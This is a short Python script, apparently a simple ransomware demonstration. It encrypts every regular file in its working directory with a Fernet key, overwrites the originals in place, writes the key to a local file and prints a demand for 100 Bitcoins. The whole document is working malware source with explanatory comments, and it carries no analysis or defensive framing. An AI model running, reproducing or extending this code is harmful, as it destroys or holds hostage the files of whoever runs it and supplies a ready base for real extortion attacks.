# Encryption python Program

# shebang

#!/usr/bin/env python3

# Importing essential python packages

import os
from cryptography.fernet import Fernet

# Creating List named files
files=[]

# Inserting every file from folder in files(list)
for file in os.listdir():
# Checking files or Avoiding python files
    if (file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py"):
        continue
# Checking only file will be taken as input
    if os.path.isfile(file):
        files.append(file)

# Printing the files list
print("Files going to be encrypted:",files)

# Generating key with python package
key = Fernet.generate_key()

# storing the symmetric key in "thekey.key" named file
with open("thekey.key","wb") as thekey:
    thekey.write(key)

# For-loop for encrypting files one-by-one
for file in files:

    with open(file,"rb") as thefile:
        content=thefile.read()
        
# Statement for encrypting the files
        content_encrypted = Fernet(key).encrypt(content)
        
        with open(file,"wb") as thefile:
            thefile.write(content_encrypted)


print("RANSOMWARE Alert !!!!")
print("SURPRISE!!!   SURPRISE!!!   SURPRISE!!!!")
print("Your File's have been Encrypted...")
print("Give us 100 Bitcoins to Decrypting it.")
